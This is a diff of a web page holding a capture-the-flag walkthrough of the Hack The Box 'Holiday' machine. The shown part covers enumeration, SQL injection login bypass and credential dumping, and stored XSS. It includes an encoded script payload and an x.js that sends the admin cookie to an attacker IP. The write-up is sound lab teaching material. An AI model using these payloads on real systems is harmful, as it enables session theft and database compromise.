@@ -1,18 +1,19 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-11:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-13:I[484,[],"OutletBoundary"]
-14:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Holiday Walkthrough"}],["$","p",null,{"className":"article-dek","children":"SQL injection recovers a valid login, stored XSS steals the administrator session, command injection creates a web shell, and passwordless npm installation executes package lifecycle code as root."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T13:04:55.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[15," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-holiday-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Holiday machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Holiday machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/holiday","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","children":["$L5","$L6","$L7",["$L8","$L9"]]}],"$La"]}]]}],null,"$Lb"]}],"$Lc","$Ld"],null,"$Le"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","$Lf",null,{"headings":[{"id":"overview-and-attack-chain","label":"Overview & Attack Chain"},{"id":"step-1-reconnaissance-port-scanning","label":"Step 1: Reconnaissance - Port Scanning"},{"id":"step-2-web-enumeration-the-user-agent-trap","label":"Step 2: Web Enumeration - The User-Agent Trap"},{"id":"step-3-sql-injection-breaking-the-login","label":"Step 3: SQL Injection - Breaking the Login"},{"id":"step-4-stored-xss-stealing-the-admin-session","label":"Step 4: Stored XSS - Stealing the Admin Session"},{"id":"step-5-command-injection-from-admin-to-shell","label":"Step 5: Command Injection - From Admin to Shell"},{"id":"step-6-privilege-escalation-npm-install-as-root","label":"Step 6: Privilege Escalation - npm install as Root"},{"id":"review-notes-and-lessons-learned","label":"Review notes & Lessons Learned"}]}]
-6:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/4cc7f5ab3a9850c823a7f25cb9da4149648ae445/HTB-Holiday.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 4cc7f5ab3a98",""]}]]]}]
-7:["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Holiday, Linux, Hard",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/holiday","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]
-8:["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-9:["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"7 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-10:T6dc5,<p><strong>Machine:</strong> Holiday<br><strong>Difficulty:</strong> Hard<br><strong>OS:</strong> Linux<br><strong>Target IP:</strong> <code>10.129.29.106</code><br><strong>Attacker IP:</strong> <code>10.10.16.84</code><br><strong>Flags:</strong></p>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+10:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+12:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+14:I[484,[],"OutletBoundary"]
+15:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Holiday Walkthrough"}],["$","p",null,{"className":"article-dek","children":"SQL injection recovers a valid login, stored XSS steals the administrator session, command injection creates a web shell, and passwordless npm installation executes package lifecycle code as root."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],["$","strong",null,{"children":"Holiday"}],"$L5","$L6"]}],"$L7","$L8"],null,null]}]]}],"$L9"]}],"$La","$Lb"]}],null,"$Lc"]}],"$Ld","$Le"],null,"$Lf"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","small",null,{"children":"Hack The Box machine record"}]
+6:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/holiday","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+7:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Linux"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Hard"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+8:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+9:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-holiday-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Holiday machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Holiday machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/holiday","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+a:["$","div",null,{"className":"article-rule"}]
+11:T76fa,<p><strong>Machine:</strong> Holiday<br><strong>Difficulty:</strong> Hard<br><strong>OS:</strong> Linux<br><strong>Target IP:</strong> <code>10.129.29.106</code><br><strong>Attacker IP:</strong> <code>10.10.16.84</code><br><strong>Flags:</strong></p>
 <ul>
 <li>User: <code>517f7d[redacted]e48b15372f</code></li>
 <li>Root: <code>6ff8785[redacted]d5a68180</code></li>
@@ -34,7 +35,7 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 <hr>
 <h2 id="step-1-reconnaissance-port-scanning">Step 1: Reconnaissance - Port Scanning</h2>
 
-<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.29.106
+<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.29.106
 nmap -p 22,8000 -sC -sV -oA scans/nmap-tcpscripts 10.129.29.106
 </code></pre>
 <h3 id="baby-step-breakdown">Baby Step Breakdown</h3>
@@ -42,7 +43,7 @@ nmap -p 22,8000 -sC -sV -oA scans/nmap-tcpscripts 10.129.29.106
 <p><strong>Why <code>--min-rate 10000</code>?</strong><br>This tells Nmap to send at least 10,000 packets per second. Without this, scanning all ports can take 20-30 minutes. We speed it up because we are on a relatively stable network (Hack The Box VPN).</p>
 <p><strong>Why <code>-sC</code> and <code>-sV</code> on the second scan?</strong><br><code>-sC</code> runs Nmap's default script suite (like checking for SSH host keys, HTTP titles, etc.). <code>-sV</code> performs version detection. We only run these on the ports we already know are open (22 and 8000) because they are much slower than the initial port discovery.</p>
 <h3 id="results">Results</h3>
-<pre><code>PORT     STATE SERVICE VERSION
+<pre tabindex="0" aria-label="Code or terminal block 2"><code>PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
 8000/tcp open  http    Node.js Express framework
 </code></pre>
@@ -56,10 +57,10 @@ nmap -p 22,8000 -sC -sV -oA scans/nmap-tcpscripts 10.129.29.106
 <h2 id="step-2-web-enumeration-the-user-agent-trap">Step 2: Web Enumeration - The User-Agent Trap</h2>
 
 <p>We tried <code>gobuster</code> with a standard wordlist. It found <strong>nothing</strong>.</p>
-<pre><code class="language-bash" data-language="bash">gobuster dir -u http://10.129.29.106:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">gobuster dir -u http://10.129.29.106:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 </code></pre>
 <p>Then we tried <code>dirsearch</code> and it found <code>/login</code>, <code>/admin</code>, <code>/logout</code>, etc.:</p>
-<pre><code class="language-bash" data-language="bash">dirsearch -u http://10.129.29.106:8000 --user-agent="Linux"
+<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash">dirsearch -u http://10.129.29.106:8000 --user-agent="Linux"
 </code></pre>
 <h3 id="baby-step-breakdown-2">Baby Step Breakdown</h3>
 <p><strong>Why did Gobuster fail?</strong><br>The application has a <strong>User-Agent filter</strong>. If your tool sends a User-Agent like <code>gobuster/3.8.2</code>, the server returns <strong>404 Not Found</strong> for every endpoint - even if the page exists. <code>dirsearch</code> sends a realistic browser User-Agent by default (<code>Mozilla/5.0...</code>), so it saw the real pages.</p>
@@ -68,14 +69,14 @@ nmap -p 22,8000 -sC -sV -oA scans/nmap-tcpscripts 10.129.29.106
 <p><strong>The Code Behind It (from source analysis):</strong>
 The app uses <code>express-useragent</code>. It checks <code>req.useragent.isDesktop || req.useragent.isMobile</code>. If neither is true, it returns 404. The library recognizes OS strings like <code>Linux</code>, <code>Windows</code>, <code>Mac</code>, <code>cros</code>, etc.</p>
 <h3 id="commands-that-work">Commands That Work</h3>
-<pre><code class="language-bash" data-language="bash"># Using dirsearch (has good default UA)
+<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash"># Using dirsearch (has good default UA)
 dirsearch -u http://10.129.29.106:8000 --user-agent="Linux"
 
 # Using gobuster (must specify UA)
 gobuster dir -u http://10.129.29.106:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --useragent "Linux"
 </code></pre>
 <h3 id="results-2">Results</h3>
-<pre><code>/admin  -&gt; /login (302)
+<pre tabindex="0" aria-label="Code or terminal block 6"><code>/admin  -&gt; /login (302)
 /login  (200)
 /logout -&gt; /login (302)
 /css, /js, /img (301)
@@ -88,7 +89,7 @@ gobuster dir -u http://10.129.29.106:8000 -w /usr/share/wordlists/dirbuster/dire
 <h3 id="baby-step-breakdown-3">Baby Step Breakdown</h3>
 <p><strong>Step 3a: Testing for SQL Injection</strong>  </p>
 <p>We started by sending single and double quotes to see if the application behaves differently:</p>
-<pre><code class="language-bash" data-language="bash">curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
+<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
   -d 'username=%22' -d 'password=REDACTED' | grep -i error
 </code></pre>
 <ul>
@@ -99,25 +100,25 @@ gobuster dir -u http://10.129.29.106:8000 -w /usr/share/wordlists/dirbuster/dire
 <p> <em>Test with BOTH <code>'</code> and <code>"</code>. Developers often remember to sanitize one but forget the other. Error messages are your best friend - they tell you exactly what the database is thinking.</em></p>
 <p><strong>Step 3b: Bypassing the Username Check</strong>  </p>
 <p>We tried a classic OR-based bypass:</p>
-<pre><code class="language-bash" data-language="bash">curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
+<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
   -d 'username=%22%20OR%20%221%22%3D%221' -d 'password=REDACTED'
 </code></pre>
 <p>Decoded: <code>username=" OR "1"="1</code></p>
 <p>Result: <strong>"Incorrect Password"</strong> - and the username field was prefilled with <strong><code>RickA</code></strong>.</p>
 <p><strong>Why did this happen?</strong><br>The query structure is something like:</p>
-<pre><code class="language-sql" data-language="sql">SELECT id, username, password, active 
+<pre tabindex="0" aria-label="sql code or terminal block 9"><code class="language-sql" data-language="sql">SELECT id, username, password, active 
 FROM users 
 WHERE (active=1 AND (username = "[INPUT]"))
 </code></pre>
 <p>Our input turned it into:</p>
-<pre><code class="language-sql" data-language="sql">WHERE (active=1 AND (username = "" OR "1"="1"))
+<pre tabindex="0" aria-label="sql code or terminal block 10"><code class="language-sql" data-language="sql">WHERE (active=1 AND (username = "" OR "1"="1"))
 </code></pre>
 <p>Since <code>"1"="1"</code> is always true, the <code>WHERE</code> clause returns the first active user in the table: <strong>RickA</strong>. The application then checked our password (which was wrong) and showed "Incorrect Password" with RickA's username prefilled.</p>
 <p> <em>A "Incorrect Password" message after a bypass is often MORE valuable than a successful login. It confirms the user exists and gives you their username.</em></p>
 <p><strong>Step 3c: UNION Injection to Extract Data</strong>  </p>
 <p>Now we wanted to dump the database. We used <code>UNION SELECT</code> to add our own fake row to the result set. But a <code>UNION</code> requires the same number of columns as the original query.</p>
 <p>We tested column counts:</p>
-<pre><code class="language-sql" data-language="sql">")) UNION SELECT 1 -- -          → Error
+<pre tabindex="0" aria-label="sql code or terminal block 11"><code class="language-sql" data-language="sql">")) UNION SELECT 1 -- -          → Error
 ")) UNION SELECT 1,2 -- -        → Error
 ")) UNION SELECT 1,2,3 -- -      → Error
 ")) UNION SELECT 1,2,3,4 -- -    → No error! Username field shows "2"
@@ -125,7 +126,7 @@ WHERE (active=1 AND (username = "[INPUT]"))
 <p><strong>Why 4 columns?</strong><br>The original query must be selecting 4 columns: probably <code>id, username, password, active</code> (which matches the table schema we later confirmed).</p>
 <p><strong>Step 3d: Extracting Credentials</strong>  </p>
 <p>We replaced the <code>2</code> with data we wanted:</p>
-<pre><code class="language-bash" data-language="bash"># Dump username
+<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash"># Dump username
 curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
   -d 'username=%22%29%29%20UNION%20SELECT%201%2Cgroup_concat%28username%29%2C3%2C4%20FROM%20users--%20-' \
   -d 'password=REDACTED' | grep -oP 'value="\K[^"]+'
@@ -138,7 +139,7 @@ curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
 # Result: REDACTED_HASH_OR_FLAG
 </code></pre>
 <p><strong>Cracking the Hash:</strong></p>
-<pre><code class="language-bash" data-language="bash">echo -n "nevergonnagiveyouup" | md5sum
+<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">echo -n "nevergonnagiveyouup" | md5sum
 # Output: REDACTED_HASH_OR_FLAG
 </code></pre>
 <p> <em>32-character hex strings are almost always MD5. Before wasting time with Hashcat, try an online database or a quick <code>md5sum</code> of common passwords. This hash is a Rickroll reference - always try pop culture references on HTB boxes.</em></p>
@@ -158,44 +159,44 @@ curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
 <p> <em>Whenever you see "pending approval," "waiting for moderator," or "under review," immediately think XSS. The system is literally telling you that a higher-privilege entity will view your input.</em></p>
 <p><strong>Step 4b: Testing the XSS Filter</strong>  </p>
 <p>We first tested a simple image tag to confirm the bot makes external requests:</p>
-<pre><code class="language-html" data-language="html">&lt;img src='http://10.10.16.84/test.jpg' /&gt;
+<pre tabindex="0" aria-label="html code or terminal block 14"><code class="language-html" data-language="html">&lt;img src='http://10.10.16.84/test.jpg' /&gt;
 </code></pre>
 <p>Within a minute, we saw a hit on our Python web server from the target IP.</p>
 <p>Then we tried a basic script:</p>
-<pre><code class="language-html" data-language="html">&lt;script&gt;alert('XSS')&lt;/script&gt;
+<pre tabindex="0" aria-label="html code or terminal block 15"><code class="language-html" data-language="html">&lt;script&gt;alert('XSS')&lt;/script&gt;
 </code></pre>
 <p>The result was mangled - the quotes were stripped, but the script tags survived partially.</p>
 <p><strong>Why did some parts survive?</strong><br>The application uses a flawed XSS filter (<code>xss</code> npm package). The filter was configured with a <strong>whitelist</strong> allowing only <code>&lt;img src="..."&gt;</code>. For the <code>src</code> attribute, it removed spaces, single quotes, and double quotes. However, the filtering logic had a gap: it processed the <code>src</code> value but didn't completely neutralize script tags that were cleverly embedded inside.</p>
 <p><strong>Step 4c: Filter Evasion with String.fromCharCode</strong>  </p>
 <p>The filter removed quotes, so we couldn't write JavaScript like:</p>
-<pre><code class="language-javascript" data-language="javascript">document.location='http://10.10.16.84/?c='+document.cookie
+<pre tabindex="0" aria-label="javascript code or terminal block 16"><code class="language-javascript" data-language="javascript">document.location='http://10.10.16.84/?c='+document.cookie
 </code></pre>
 <p>Instead, we encoded our entire payload as <strong>ASCII/Unicode character codes</strong> and used <code>String.fromCharCode()</code> to reconstruct it at runtime:</p>
-<pre><code class="language-python" data-language="python">payload = """document.write('&lt;script src="http://10.10.16.84/x.js"&gt;&lt;/script&gt;')"""
+<pre tabindex="0" aria-label="python code or terminal block 17"><code class="language-python" data-language="python">payload = """document.write('&lt;script src="http://10.10.16.84/x.js"&gt;&lt;/script&gt;')"""
 nums = [str(ord(i)) for i in payload]
 print('&lt;img src="x/&gt;&lt;script&gt;eval(String.fromCharCode('+','.join(nums)+'));&lt;/script&gt;"&gt;')
 </code></pre>
 <p><strong>Why does this work?</strong><br>The filter sees numbers and commas - completely harmless characters. It doesn't understand that <code>eval(String.fromCharCode(...))</code> will reconstruct dangerous strings at execution time. This is a classic <strong>filter evasion</strong> technique.</p>
 <p><strong>The Final Payload:</strong></p>
-<pre><code class="language-html" data-language="html">&lt;img src="x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,56,52,47,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;"&gt;
+<pre tabindex="0" aria-label="html code or terminal block 18"><code class="language-html" data-language="html">&lt;img src="x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,56,52,47,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;"&gt;
 </code></pre>
 <p><strong>Step 4d: The External JavaScript File (x.js)</strong>  </p>
 <p>Why use an external file instead of putting everything in the payload?<br>Because the filter is unpredictable. By loading an external script, we have full control over the code that executes. The external script runs in the admin's browser with admin privileges.</p>
 <p>We created <code>x.js</code>:</p>
-<pre><code class="language-javascript" data-language="javascript">window.addEventListener('DOMContentLoaded', function(e) {
+<pre tabindex="0" aria-label="javascript code or terminal block 19"><code class="language-javascript" data-language="javascript">window.addEventListener('DOMContentLoaded', function(e) {
     window.location = "http://10.10.16.84:81/?cookie=" + encodeURI(document.getElementsByName("cookie")[0].value)
 })
 </code></pre>
 <p><strong>Why <code>document.getElementsByName("cookie")</code>?</strong><br>The application renders a hidden input on the booking page:</p>
-<pre><code class="language-html" data-language="html">&lt;input type="hidden" name="cookie" value="connect.sid=..."&gt;
+<pre tabindex="0" aria-label="html code or terminal block 20"><code class="language-html" data-language="html">&lt;input type="hidden" name="cookie" value="connect.sid=..."&gt;
 </code></pre>
 <p>Our script reads this value and sends it to our listener.</p>
 <p><strong>Step 4e: Setting Up Listeners</strong>  </p>
 <p>Terminal 1 (serve the malicious JS):</p>
-<pre><code class="language-bash" data-language="bash">sudo python3 -m http.server 80
+<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">sudo python3 -m http.server 80
 </code></pre>
 <p>Terminal 2 (catch the exfiltrated cookie):</p>
-<pre><code class="language-bash" data-language="bash">nc -lnvp 81
+<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">nc -lnvp 81
 </code></pre>
 <p><strong>Step 4f: Submitting the Note</strong>  </p>
 <ol>
@@ -206,7 +207,7 @@ print('&lt;img src="x/&gt;&lt;script&gt;eval(String.fromCharCode('+','.join(nums
 <li>Submit and wait ~60 seconds.</li>
 </ol>
 <p><strong>Result:</strong></p>
-<pre><code>GET /?cookie=REDACTED HTTP/1.1
+<pre tabindex="0" aria-label="Code or terminal block 23"><code>GET /?cookie=REDACTED HTTP/1.1
 User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
 </code></pre>
 <p>The <code>User-Agent: PhantomJS/2.1.1</code> confirms the "administrator" is actually a <strong>headless browser bot</strong>.</p>
@@ -220,22 +221,22 @@ User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like G
 <p>With the admin cookie, we visited <code>http://10.129.29.106:8000/admin</code>. We saw an "Export Bookings" and "Export Notes" button.</p>
